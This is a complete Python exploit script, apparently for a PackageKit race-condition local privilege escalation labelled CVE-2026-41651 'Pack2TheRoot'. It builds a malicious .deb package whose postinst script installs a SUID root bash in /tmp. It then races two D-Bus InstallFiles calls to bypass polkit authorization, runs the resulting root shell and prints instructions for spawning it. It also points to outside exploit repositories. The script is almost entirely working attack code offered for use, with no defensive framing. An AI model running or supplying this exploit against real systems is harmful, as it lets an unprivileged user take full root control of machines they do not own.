python3 << 'PACK2ROOT'
# CVE-2026-41651 Pack2TheRoot — PackageKit TOCTOU LPE
# Requires: python3-gi, python3-dbus (present on any Debian desktop)

import subprocess, os, sys, tempfile, time

print("=== CVE-2026-41651 Pack2TheRoot ===")
print("[*] Checking prerequisites...")

# ── Step 1: Version check ──
pk_ver = subprocess.run(
    ["dpkg-query", "-W", "-f=${Version}", "packagekit"],
    capture_output=True, text=True).stdout.strip()

if not pk_ver:
    print("[-] PackageKit not installed — not exploitable")
    sys.exit(1)

print(f"[+] PackageKit version: {pk_ver}")

import re
m = re.search(r'1\.(\d+)\.(\d+)', pk_ver)
if m:
    minor, patch = int(m.group(1)), int(m.group(2))
    if minor > 3 or (minor == 3 and patch >= 5):
        print(f"[-] Version {pk_ver} is PATCHED (≥ 1.3.5)")
        sys.exit(0)
    print(f"[!] VULNERABLE: {pk_ver} is in range 1.0.2 – 1.3.4")
else:
    print(f"[?] Cannot parse version: {pk_ver}")

# ── Step 2: Check D-Bus activatability ──
try:
    import gi
    gi.require_version('Gio', '2.0')
    from gi.repository import Gio, GLib
    print("[+] python3-gi available — D-Bus exploit possible")
    DBUS_AVAILABLE = True
except ImportError:
    print("[!] python3-gi not available — use dbus-send method instead")
    DBUS_AVAILABLE = False

# ── Step 3: Build malicious .deb packages ──
def build_deb(name, version, postinst_script=None):
    """Build a minimal .deb package with optional postinst"""
    tmpdir = tempfile.mkdtemp(prefix=f'/tmp/.pk-{name}-')
    
    # Control directory
    ctrl_dir = os.path.join(tmpdir, 'DEBIAN')
    os.makedirs(ctrl_dir)
    
    # Control file
    with open(os.path.join(ctrl_dir, 'control'), 'w') as f:
        f.write(f"""Package: {name}
Version: {version}
Architecture: amd64
Maintainer: test
Description: {name} test package
""")
    
    # postinst script
    if postinst_script:
        postinst_path = os.path.join(ctrl_dir, 'postinst')
        with open(postinst_path, 'w') as f:
            f.write(f"#!/bin/bash\n{postinst_script}\n")
        os.chmod(postinst_path, 0o755)
    
    # Build the .deb
    deb_path = f'/tmp/.pk-{name}-{time.time_ns()}.deb'
    result = subprocess.run(
        ['dpkg-deb', '--build', tmpdir, deb_path],
        capture_output=True)
    
    if result.returncode == 0:
        print(f"[+] Built: {deb_path}")
        return deb_path
    else:
        print(f"[-] Build failed: {result.stderr.decode()}")
        return None

# Build dummy (benign) package
dummy_deb = build_deb("pk-dummy-legit", "1.0.0")

# Build payload package — postinst creates SUID bash
SUID_PATH = "/tmp/.suid_bash"
payload_postinst = f"""
install -m 4755 /bin/bash {SUID_PATH}
echo "[+] Pack2TheRoot: SUID bash created at {SUID_PATH}"
"""
payload_deb = build_deb("pk-payload-evil", "1.0.0", payload_postinst)

if not dummy_deb or not payload_deb:
    print("[-] Package building failed — is dpkg-deb installed?")
    sys.exit(1)

print(f"[+] Dummy  package: {dummy_deb}")
print(f"[+] Payload package: {payload_deb}")

if not DBUS_AVAILABLE:
    print("\n[!] Run the C exploit instead:")
    print(f"    # Install gcc if needed: apt install gcc")
    print(f"    # Download: github.com/Vozec/CVE-2026-41651")
    print(f"    # Or use: github.com/mawussid/CVE-2026-41651-Python")
    sys.exit(0)

# ── Step 4: D-Bus TOCTOU exploit ──
print("\n[*] Launching D-Bus TOCTOU exploit...")
print("[*] Connecting to org.freedesktop.PackageKit...")

try:
    from gi.repository import Gio, GLib

    bus = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)

    # Create PackageKit proxy
    pk_proxy = Gio.DBusProxy.new_sync(
        bus,
        Gio.DBusProxyFlags.NONE,
        None,
        "org.freedesktop.PackageKit",
        "/org/freedesktop/PackageKit",
        "org.freedesktop.PackageKit",
        None
    )

    # CreateTransaction
    tid = pk_proxy.call_sync(
        "CreateTransaction", None,
        Gio.DBusCallFlags.NONE, 10000, None
    ).unpack()[0]
    
    print(f"[+] Transaction created: {tid}")

    # Get Transaction proxy
    tx_proxy = Gio.DBusProxy.new_sync(
        bus,
        Gio.DBusProxyFlags.NONE,
        None,
        "org.freedesktop.PackageKit",
        tid,
        "org.freedesktop.PackageKit.Transaction",
        None
    )

    # ── THE TOCTOU EXPLOIT ──
    # Step A: Call InstallFiles(SIMULATE=4, dummy) — bypasses polkit
    # Step B: Immediately call InstallFiles(NONE=0, payload) — overwrites
    # Both arrive before GLib idle can fire → payload installs as root
    
    FLAG_SIMULATE = GLib.Variant('u', 4)
    FLAG_NONE = GLib.Variant('u', 0)
    
    print("[*] Step 1: InstallFiles(SIMULATE, dummy) [async, fire-and-forget]")
    tx_proxy.call(
        "InstallFiles",
        GLib.Variant('(uas)', (4, [dummy_deb])),
        Gio.DBusCallFlags.NO_AUTO_START,
        -1, None, None, None
    )
    
    print("[*] Step 2: InstallFiles(NONE, payload) [async, fire-and-forget]")
    tx_proxy.call(
        "InstallFiles",
        GLib.Variant('(uas)', (0, [payload_deb])),
        Gio.DBusCallFlags.NO_AUTO_START,
        -1, None, None, None
    )

    # Flush both messages to the socket before GLib idle fires
    ctx = GLib.MainContext.default()
    ctx.iteration(False)
    ctx.iteration(False)
    
    print("[*] Waiting for SUID bash to appear (max 120s)...")
    for i in range(120):
        if os.path.exists(SUID_PATH) and os.stat(SUID_PATH).st_uid == 0:
            print(f"\n[+] SUCCESS! SUID bash at: {SUID_PATH}")
            result = subprocess.run(
                [SUID_PATH, '-p', '-c', 'id'],
                capture_output=True, text=True)
            print(f"[+] id output: {result.stdout.strip()}")
            print(f"\n[*] Spawn root shell with:")
            print(f"    {SUID_PATH} -p")
            break
        time.sleep(1)
        if i % 10 == 0:
            print(f"  ... waiting {i}s")
    else:
        print("[-] Timeout — exploit may have failed or been patched")
        print("[*] Check journalctl -u packagekit for error details")

except Exception as e:
    print(f"[-] D-Bus exploit failed: {e}")
    print("[*] Try the standalone C exploit from github.com/Vozec/CVE-2026-41651")

PACK2ROOT
